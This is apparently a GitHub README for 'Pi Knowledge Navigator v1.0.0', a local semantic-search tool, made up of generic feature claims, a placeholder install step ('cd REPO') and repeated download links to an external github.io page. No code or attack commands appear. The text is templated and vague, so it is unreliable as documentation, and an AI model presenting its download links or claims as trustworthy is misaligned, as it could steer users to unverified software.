# Pi Knowledge Navigator v1.0.0 - semantic search tool 2026

> **Private semantic search for local knowledge bases and AI-assisted workflows.** Pi Knowledge Navigator v1.0.0 lets you index files on your own machine, search by meaning, and plug the results into LLM-powered tooling without moving data off-device.

[![Platform](https://img.shields.io/badge/Platform-local%20file%20systems-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/michaelwalker40/pi-knowledge-navigator?style=flat-square)](https://github.com/michaelwalker40/pi-knowledge-navigator)

---

<p align="center">
  <a href="https://michaelwalker40.github.io/pi-knowledge-navigator/">
    <img src="https://img.shields.io/badge/Download-Pi%20Knowledge%20Navigator%20Latest-brightgreen?style=for-the-badge" alt="Download Pi Knowledge Navigator">
  </a>
</p>

> **[Direct Download - Pi Knowledge Navigator v1.0.0](https://michaelwalker40.github.io/pi-knowledge-navigator/)**

---

[Download Latest Build](https://michaelwalker40.github.io/pi-knowledge-navigator/)

---

## What Pi Knowledge Navigator Does

Pi Knowledge Navigator turns a local file tree into a searchable knowledge base. Using embeddings, chunking, and vector search, it helps you find the most relevant material by intent and context instead of depending on exact filenames or keyword matches.

The project is aimed at privacy-conscious setups where you want full control over data handling. It works well for notes, documentation, research folders, project references, and developer assets, with local indexing, automatic updates through file watching, and access through both a web interface and LLM-compatible integrations.

---

## Features

- Semantic vector search across local files
- Real-time file watching and re-indexing
- Knowledge search access for LLM tools through `knowledge_search`
- Multilingual search support
- Local-only processing for privacy-first workflows
- Smart chunking with context retention
- Web UI for interactive querying
- Compatibility with OpenAI, Claude, and local LLMs

---

## Installation

Clone the repository and move into the project folder:

git clone https://github.com/michaelwalker40/pi-knowledge-navigator.git
cd REPO

Then install the required dependencies for your runtime and start the application using the project entry point provided by the repository. If you are using a packaged build, download the latest release and launch it from the extracted folder.

---

## Usage

1. Choose the folder you want Pi Knowledge Navigator to index.
2. Allow it to generate embeddings and save them in the local vector database.
3. Run searches from the web UI with natural language prompts.
4. Call `knowledge_search` from your LLM workflow when the agent needs supporting context.
5. Leave file watching enabled if you want the index to stay synchronized with ongoing changes.

Example workflow:

- Add notes, docs, or reference files to a watched directory.
- Ask a question in plain language.
- Review the most relevant chunks and follow-up matches.
- Feed the returned context into your assistant, coding agent, or research process.

---

## Configuration

Runtime settings are usually stored in the app's project configuration. Typical values cover the indexed directory, watcher rules, embedding provider, LLM provider, and the vector database path.

Example configuration shape:

{
  "index_path": "./data/index",
  "watch_files": true,
  "embedding_provider": "openai",
  "llm_provider": "local",
  "language_mode": "multilingual"
}

If your installation relies on environment variables or a separate settings file, update those values before the first launch.

---

## Requirements

- A system that can access local file systems
- Storage for indexed chunks and vector data
- A supported runtime for the application build
- Network access only if you choose hosted providers such as OpenAI or Claude
- Enough memory and disk space for the size of the knowledge base you plan to index

---

## FAQ

**How do I keep the index updated?**  
Turn on file watching so newly added or modified files are detected automatically.

**Can I use my own model provider?**  
Yes. The profile includes support for OpenAI, Claude, and local LLMs.

**Does it work with multiple languages?**  
Yes. Multilingual search support is included in the feature set.

**Where do I change search or indexing behavior?**  
Check the app configuration and any runtime settings used by your installation.

**What if search results are not what I expect?**  
Try re-indexing the folder, verifying the watched path, and adjusting chunking or provider settings for your content.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
